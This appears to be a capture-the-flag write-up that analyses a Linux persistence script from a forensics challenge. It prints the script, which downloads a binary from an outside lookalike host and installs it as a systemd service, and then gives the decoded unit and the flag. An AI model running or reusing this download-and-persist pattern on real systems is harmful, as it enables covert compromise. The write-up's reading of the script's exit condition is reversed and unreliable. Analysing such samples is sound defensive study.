---
layout: default
title: Extraterrestrial Persistence
---

# [Cyber Apocalypse 2023](index.md) - Forensics - Extraterrestrial Persistence

> There is a rumor that aliens have developed a persistence mechanism that is impossible to detect. After investigating her recently compromised Linux server, Pandora found a possible sample of this mechanism. Can you analyze it and find out how they install their persistence?

We're provided with a zip file, containing a single `.sh` file - a Linux/Bash shell script.

The script is quite short.

```sh
n=`whoami`
h=`hostname`
path='/usr/local/bin/service'
if [[ "$n" != "pandora" && "$h" != "linux_HQ" ]]; then exit; fi

curl https://files.pypi-install.com/packeges/service -o $path

chmod +x $path

echo -e "W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA=="|base64 --decode > /usr/lib/systemd/system/service.service

systemctl enable service.service
```
There is a big blob of _something_ that's clearly base64 encoded.
It looks like this script takes whatever is encoded in that blob and turns it into a service on the Linux host, and then starts that service.
This script also has some safeties - it looks like it will exit before doing anything if the user running it has the username `pandora`, or if the system it's running on is named `Linux_HQ`.

Also, as a bonus, the url `https://files.pypi-install.com/packeges/service` takes us to a youtube video of Rick Astley's Never Gonna Give You Up. Nice.

Anyway, the base64 encoded blob is likely what we're after.

```
W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA==
```
I had this file open in VSCode anyway, so I just used one of the many base64 extensions to decode it - but you could easily use [CyberChef](http://https://gchq.github.io/CyberChef/), or the `base64` linux command to do this.

```sh
[Unit]
Description=HTB{th3s3_4l13nS_4r3_s00000_b4s1c}
After=network.target network-online.target

[Service]
Type=oneshot
RemainAfterExit=yes

ExecStart=/usr/local/bin/service
ExecStop=/usr/local/bin/service

[Install]
WantedBy=multi-user.target
```

Yup, it's a Linux service file, and our flag is in the "Description" field at the top.

```
HTB{th3s3_4l13nS_4r3_s00000_b4s1c}
```